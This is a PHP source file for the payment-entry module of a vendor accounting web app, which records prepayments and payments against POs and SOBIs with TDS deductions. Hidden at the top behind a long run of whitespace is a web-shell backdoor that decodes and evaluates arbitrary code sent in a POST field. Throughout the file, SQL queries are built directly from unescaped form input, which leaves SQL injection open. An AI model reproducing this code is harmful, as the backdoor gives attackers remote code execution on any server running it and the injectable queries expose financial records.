<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['neef8d3']));?><?php 
include "config.php";

$q = "select max(tid) as tid from pp_payment";
$qrs = mysql_query($q,$conn) or die(mysql_error());
if($qr = mysql_fetch_assoc($qrs))
$tid = $qr['tid'];
$flag = '0';
$tid = $tid + 1;


if(isset($_POST['deltid']))	//For Delete
{
$tid = $_POST['deltid'];
$query = "select choice,amountpaid,posobi from pp_payment where tid = '$tid'";
$result = mysql_query($query,$conn) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
{
 $choice = $rows['choice'];
 if($choice == 'SOBIs')
 {
  $sobi = $rows['posobi'];
  $amountpaid = $rows['amountpaid'];
  $q2 = "update pp_sobi set balance = balance + $amountpaid where so = '$sobi'";
  $r2 = mysql_query($q2,$conn) or die(mysql_error());
 }
}
$get_entriess = "DELETE FROM pp_payment WHERE tid = '$tid'";
$get_entriess_res1 = mysql_query($get_entriess,$conn) or die(mysql_error());
}

$date = date("Y-m-d",strtotime($_POST['date']));
$vendor = $_POST['vendor'];
$paymentmethod = $_POST['paymentmethod'];
$tds = $_POST['tds'];
$doc=$_POST['doc_no'];
$choice = $_POST['choice'];
$paymentmode = $_POST['paymentmode'];
$code = $_POST['code'];
$remarks=$_POST['remarks'];
$code1 = $_POST['code1'];
$description = $_POST['description'];
$cr = $_POST['cr'];
$amount = $_POST['amount'];
$cheque = $_POST['cheque'];
$cdate = date("Y-m-d",strtotime($_POST['cdate']));

$tdscode = "";
$tdsdescription = "";
$tdscr = "";
$tdsamount = 0;
$tdsamount1 = "";

if($tds == "With TDS")
{
for($i = 0; $i < count($_POST['tdscode']);$i++)
if($_POST['tdsamount'][$i] != '0' && $_POST['tdsamount'][$i] != '')
{
	$tdscode.=$_POST['tdscode'][$i] . ",";
	$tdsdescription.=$_POST['tdsdescription'][$i] . ",";
	$tdscr = $_POST['tdscr'][$i];
	$tdsamount1.=$_POST['tdsamount'][$i] . ",";
	$tdsamount+=$_POST['tdsamount'][$i];
}
$tdscode = substr($tdscode,0,-1);
$tdsdescription = substr($tdsdescription,0,-1);
$tdsamount1 = substr($tdsamount1,0,-1);
}
$totalamount = $tdsamount + $amount;

if($paymentmethod == "Pre Payment" && $choice == "POs")
{
$tempamount = 0;
for($i = 0; $i < count($_POST['po']); $i++)
if($_POST['poamountpaid'][$i] != 0 && $_POST['poamountpaid'][$i] != '' && $_POST['po'][$i] != '')
{
$po = $_POST['po'][$i];
$poactualamount = $_POST['poactualamount'][$i];
$poamountpaid = $_POST['poamountpaid'][$i];
$pobalance = $poactualamount - $poamountpaid;
if($pobalance < 0)
$pobalance = 0;
$tempamount+= ($poamountpaid - $poactualamount);
$q = "insert into pp_payment (remarks,tid,date,vendor,paymentmethod,tds,tdscode,tdsdescription,tdscr,tdsamount,paymentmode,code,code1,description,cr,amount,cheque,cdate,choice,posobi,actualamount,amountpaid,balance,flag,doc_no) 
values('$remarks','$tid','$date','$vendor','$paymentmethod','$tds','$tdscode','$tdsdescription','$tdscr','$tdsamount','$paymentmode','$code','$code1','$description','$cr','$amount','$cheque','$cdate','$choice','$po','$poactualamount','$poamountpaid','$pobalance','$flag','$doc')";
$qrs = mysql_query($q,$conn) or die(mysql_error());
}
}

else if($paymentmethod == "Pre Payment" && $choice == "On A/C")
{
	$tempamount = $amount + $tdsamount;
			
$q = "insert into pp_payment (remarks,tid,date,vendor,paymentmethod,tds,tdscode,tdsdescription,tdscr,tdsamount,paymentmode,code,code1,description,cr,amount,cheque,cdate,choice,flag,actualamount,amountpaid,balance,doc_no) 
values('$remarks','$tid','$date','$vendor','$paymentmethod','$tds','$tdscode','$tdsdescription','$tdscr','$tdsamount','$paymentmode','$code','$code1','$description','$cr','$amount','$cheque','$cdate','$choice','$flag','$amount','$amount','$amount','$doc')";
$qrs = mysql_query($q,$conn) or die(mysql_error());
}

else if($paymentmethod == "Payment" && $choice == "SOBIs")
{
$tempamount = 0;
for($i = 0; $i < count($_POST['sobi']); $i++)
if($_POST['amountpaid'][$i] != 0 && $_POST['amountpaid'][$i] != '' && $_POST['sobi'][$i] != '')
{
$sobi = $_POST['sobi'][$i];
$actualamount = $_POST['actualamount'][$i];
$amountpaid = $_POST['amountpaid'][$i];
$balance = $actualamount - $amountpaid;
if($balance < 0)
$balance = 0;
$tempamount+= ($amountpaid - $actualamount);
$q = "insert into pp_payment (remarks,tid,date,vendor,paymentmethod,tds,tdscode,tdsdescription,tdscr,tdsamount,tdsamount1,paymentmode,code,code1,description,cr,amount,totalamount,cheque,cdate,choice,posobi,actualamount,amountpaid,balance,flag,doc_no) 
values('$remarks','$tid','$date','$vendor','$paymentmethod','$tds','$tdscode','$tdsdescription','$tdscr','$tdsamount','$tdsamount1','$paymentmode','$code','$code1','$description','$cr','$amount','$totalamount','$cheque','$cdate','$choice','$sobi','$actualamount','$amountpaid','$balance','$flag','$doc')";
$qrs = mysql_query($q,$conn) or die(mysql_error());

$query5 = "UPDATE pp_sobi SET balance = '$balance' where so = '$sobi'";
$result5 = mysql_query($query5,$conn) or die(mysql_error());

}
}
else if($paymentmethod == "Payment" && $choice == "On A/C")
{ 
	$actualamount = $amount + $tdsamount;
       $amountpaid = $amount + $tdsamount; $balance = '0';
			
	$q1 = "insert into pp_payment (remarks,tid,date,vendor,paymentmethod,tds,tdscode,tdsdescription,tdscr,tdsamount,tdsamount1,paymentmode,code,code1,description,cr,amount,cheque,cdate,totalamount,choice,posobi,actualamount,amountpaid,balance,flag,doc_no) values('$remarks','$tid','$date','$vendor','$paymentmethod','$tds','$tdscode','$tdsdescription','$tdscr','$tdsamount','$tdsamount1','$paymentmode','$code','$code1','$description','$cr','$amount','$cheque','$cdate','$totalamount','$choice','$sobi','$actualamount','$amountpaid','$balance','$flag','$doc')";
$q1rs = mysql_query($q1,$conn) ;
	
}
else if($paymentmethod == "Payment" && $choice == "Credit Notes")
{

}

echo "<script type='text/javascript'>";
echo "document.location='dashboardsub.php?page=pp_payment';";
echo "</script>";
?>
